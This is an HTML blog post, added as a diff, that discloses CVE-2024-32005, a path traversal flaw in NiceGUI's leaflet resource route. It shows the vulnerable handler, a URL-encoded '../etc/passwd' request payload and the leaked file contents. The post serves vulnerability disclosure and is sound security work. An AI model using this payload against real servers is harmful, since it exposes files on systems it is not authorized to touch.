@@ -1,0 +1,224 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>CVE-2024-32005: Local File Inclusion in NiceGUI leaflet component | sunriseXu’s bug hunting journey</title>
+<meta name="generator" content="Jekyll v4.3.3" />
+<meta property="og:title" content="CVE-2024-32005: Local File Inclusion in NiceGUI leaflet component" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Name" />
+<meta property="og:description" content="Name" />
+<link rel="canonical" href="http://localhost:4000/file-overwrite/2024/04/10/local-file-inclusion-in-nicegui.html" />
+<meta property="og:url" content="http://localhost:4000/file-overwrite/2024/04/10/local-file-inclusion-in-nicegui.html" />
+<meta property="og:site_name" content="sunriseXu’s bug hunting journey" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2024-04-10T10:31:06+08:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="CVE-2024-32005: Local File Inclusion in NiceGUI leaflet component" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2024-04-10T10:31:06+08:00","datePublished":"2024-04-10T10:31:06+08:00","description":"Name","headline":"CVE-2024-32005: Local File Inclusion in NiceGUI leaflet component","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/file-overwrite/2024/04/10/local-file-inclusion-in-nicegui.html"},"url":"http://localhost:4000/file-overwrite/2024/04/10/local-file-inclusion-in-nicegui.html"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/assets/main.css"><link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="sunriseXu&apos;s bug hunting journey" /></head>
+<body><header class="site-header" role="banner">
+
+  <div class="wrapper"><a class="site-title" rel="author" href="/">sunriseXu&#39;s bug hunting journey</a><nav class="site-nav">
+        <input type="checkbox" id="nav-trigger" class="nav-trigger" />
+        <label for="nav-trigger">
+          <span class="menu-icon">
+            <svg viewBox="0 0 18 15" width="18px" height="15px">
+              <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
+            </svg>
+          </span>
+        </label>
+
+        <div class="trigger"><a class="page-link" href="/about/">About</a></div>
+      </nav></div>
+</header>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+
+  <header class="post-header">
+    <h1 class="post-title p-name" itemprop="name headline">CVE-2024-32005: Local File Inclusion in NiceGUI leaflet component</h1>
+    <p class="post-meta">
+      <time class="dt-published" datetime="2024-04-10T10:31:06+08:00" itemprop="datePublished">Apr 10, 2024
+      </time></p>
+  </header>
+
+  <div class="post-content e-content" itemprop="articleBody">
+    <h2 id="name">Name</h2>
+
+<blockquote>
+  <p>NiceGUI: Local File Inclusion in NiceGUI leaflet component</p>
+</blockquote>
+
+<h2 id="weakness">Weakness</h2>
+
+<blockquote>
+  <p>CWE-22: Path Traversal</p>
+</blockquote>
+
+<h2 id="severity">Severity</h2>
+
+<blockquote>
+  <p>High (8.8)</p>
+</blockquote>
+
+<h2 id="cve">CVE</h2>
+
+<blockquote>
+  <p><a href="https://www.cve.org/CVERecord?id=CVE-2024-32005">CVE-2024-32005: Local File Inclusion in NiceGUI leaflet component</a></p>
+</blockquote>
+
+<h2 id="description">Description</h2>
+
+<p>A local file inclusion is present in the NiceUI leaflet component when requesting resource files under the <code class="language-plaintext highlighter-rouge">/_nicegui/{__version__}/resources/{key}/{path:path}</code> route.</p>
+
+<h2 id="proof-of-concept">Proof of Concept</h2>
+
+<p>In <a href="https://github.com/zauberzeug/nicegui/blob/eac5a5faa9fbd8823a6b76784a76fce618fd7afc/nicegui/nicegui.py#L98">route</a> <code class="language-plaintext highlighter-rouge">/_nicegui/{__version__}/resources/{key}/{path:path}</code> is used for <a href="https://github.com/zauberzeug/nicegui/commit/b465af3bb7a825c89ca6562e5eb7ebfeee5bb589">serving CSS and JS resources locally</a>. The <code class="language-plaintext highlighter-rouge">path</code> parameter in url is not sanitized before appended to base path, an attacker can use <code class="language-plaintext highlighter-rouge">..</code> to escape base directory and locate any file on system which will be sent back to the attacker, causing local file inclusion issue.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>@app.get(f'/_nicegui/{__version__}' + '/resources/{key}/{path:path}')
+def _get_resource(key: str, path: str) -&gt; FileResponse:
+    if key in resources:
+        filepath = resources[key].path / path
+        if filepath.exists():
+            headers = {'Cache-Control': 'public, max-age=3600'}
+            media_type, _ = mimetypes.guess_type(filepath)
+            return FileResponse(filepath, media_type=media_type, headers=headers)
+    raise HTTPException(status_code=404, detail=f'resource "{key}" not found')
+</code></pre></div></div>
+
+<p>However, the <code class="language-plaintext highlighter-rouge">resources</code> is only <a href="https://github.com/zauberzeug/nicegui/blob/eac5a5faa9fbd8823a6b76784a76fce618fd7afc/nicegui/elements/leaflet.py#L40">initialized</a> by <code class="language-plaintext highlighter-rouge">ui.leaflet</code> component. To exploit the bug, a developer should use <code class="language-plaintext highlighter-rouge">leaflet</code> component in web pages so that the route is activated. Consider following <a href="https://nicegui.io/documentation/leaflet#leaflet_map">code snippet</a> from official document.</p>
+
+<p>Firstly, install nicegui using <code class="language-plaintext highlighter-rouge">python pip</code>:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pip install nicegui
+</code></pre></div></div>
+<p>Then, save following code to <code class="language-plaintext highlighter-rouge">main.py</code></p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>from nicegui import ui
+
+m = ui.leaflet(center=(51.505, -0.09))
+ui.label().bind_text_from(m, 'center', lambda center: f'Center: {center[0]:.3f}, {center[1]:.3f}')
+ui.label().bind_text_from(m, 'zoom', lambda zoom: f'Zoom: {zoom}')
+
+with ui.grid(columns=2):
+    ui.button('London', on_click=lambda: m.set_center((51.505, -0.090)))
+    ui.button('Berlin', on_click=lambda: m.set_center((52.520, 13.405)))
+    ui.button(icon='zoom_in', on_click=lambda: m.set_zoom(m.zoom + 1))
+    ui.button(icon='zoom_out', on_click=lambda: m.set_zoom(m.zoom - 1))
+
+ui.run()
+</code></pre></div></div>
+<p>Run the application, it will listen on <code class="language-plaintext highlighter-rouge">http://127.0.0.1:8080</code> by default.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python main.py
+</code></pre></div></div>
+<p>Open the webpage in browser and intecept requests using burp suite or chrome devtools. We can capture following request:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GET http://10.15.0.171:8080/_nicegui/1.4.20/resources/763203f93f18a3f1f5d14f74197580e4/leaflet/leaflet.js HTTP/1.1
+Accept: */*
+Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7,ja-JP;q=0.6,ja;q=0.5
+Cache-Control: no-cache
+Cookie: 
+Pragma: no-cache
+Referer: http://10.15.0.171:8080/
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36
+Postman-Token: 73930b8b-6cc7-4511-aff9-ff25d835c300
+Host: 10.15.0.171:8080
+Accept-Encoding: gzip, deflate
+Connection: close
+</code></pre></div></div>
+<p>Modify the request by change <code class="language-plaintext highlighter-rouge">leaflet/leaflet.js</code> part to <code class="language-plaintext highlighter-rouge">%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64</code> which is <code class="language-plaintext highlighter-rouge">../../../../../etc/passwd</code> url-encoded content.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GET http://10.15.0.171:8080/_nicegui/1.4.20/resources/763203f93f18a3f1f5d14f74197580e4/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64 HTTP/1.1
+Accept: */*
+Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7,ja-JP;q=0.6,ja;q=0.5
+Cache-Control: no-cache
+Cookie: _xsrf=2|87674a0e|961e2a9f73992956aae527a8f55167fb|1706518977; _gitlab_session=64bf3e7143f852d8e3646970f8c7b3df; fakesession=hello
+Pragma: no-cache
+Referer: http://10.15.0.171:8080/
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36
+Postman-Token: 73930b8b-6cc7-4511-aff9-ff25d835c300
+Host: 10.15.0.171:8080
+Accept-Encoding: gzip, deflate
+Connection: close
+</code></pre></div></div>
+
+<p>Or just open link: <code class="language-plaintext highlighter-rouge">http://10.15.0.171:8080/_nicegui/1.4.20/resources/763203f93f18a3f1f5d14f74197580e4/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64</code> in browser(change ip and port to your server).</p>
+
+<p>The output is the contents of the <code class="language-plaintext highlighter-rouge">/etc/passwd</code> file:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
+...
+</code></pre></div></div>
+
+<p><img src="/assets/cve/niceui.png" alt="niceui" /></p>
+
+<h2 id="impact">Impact</h2>
+
+<p>Any file on the backend filesystem can be read by an attacker with access to the NiceUI leaflet website.</p>
+
+<h2 id="reference">Reference</h2>
+
+<p><a href="https://github.com/zauberzeug/nicegui/issues/2870">https://github.com/zauberzeug/nicegui/issues/2870</a></p>
+
+<p><a href="https://www.cve.org/CVERecord?id=CVE-2024-32005">https://www.cve.org/CVERecord?id=CVE-2024-32005</a></p>
+
+<p><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-32005">https://nvd.nist.gov/vuln/detail/CVE-2024-32005</a></p>
+
+<p><a href="https://github.com/zauberzeug/nicegui/security/advisories/GHSA-mwc7-64wg-pgvj">https://github.com/zauberzeug/nicegui/security/advisories/GHSA-mwc7-64wg-pgvj</a></p>
+
+<p><a href="https://huntr.com/bounties/29ec621a-bd69-4225-ab0f-5bb8a1d10c67">https://huntr.com/bounties/29ec621a-bd69-4225-ab0f-5bb8a1d10c67</a></p>
+
+<h2 id="occurrences">Occurrences</h2>
+
+<p><a href="https://github.com/zauberzeug/nicegui/blob/eac5a5faa9fbd8823a6b76784a76fce618fd7afc/nicegui/nicegui.py#L98">https://github.com/zauberzeug/nicegui/blob/eac5a5faa9fbd8823a6b76784a76fce618fd7afc/nicegui/nicegui.py#L98</a></p>
+
+  </div><a class="u-url" href="/file-overwrite/2024/04/10/local-file-inclusion-in-nicegui.html" hidden></a>
+</article>
+
+      </div>
+    </main><footer class="site-footer h-card">
+  <data class="u-url" href="/"></data>
+
+  <div class="wrapper">
+
+    <h2 class="footer-heading">sunriseXu&#39;s bug hunting journey</h2>
+
+    <div class="footer-col-wrapper">
+      <div class="footer-col footer-col-1">
+        <ul class="contact-list">
+          <li class="p-name">sunriseXu&#39;s bug hunting journey</li><li><a class="u-email" href="mailto:github@example.com">github@example.com</a></li></ul>
+      </div>
+
+      <div class="footer-col footer-col-2"><ul class="social-media-list"><li><a href="https://github.com/jekyll"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#github"></use></svg> <span class="username">jekyll</span></a></li><li><a href="https://www.twitter.com/jekyllrb"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#twitter"></use></svg> <span class="username">jekyllrb</span></a></li></ul>
+</div>
+
+      <div class="footer-col footer-col-3">
+        <p>sunriseXu&#39;s bug hunting journey, sharing new findings of bug hunting.</p>
+      </div>
+    </div>
+
+  </div>
+
+</footer>
+</body>
+
+</html>
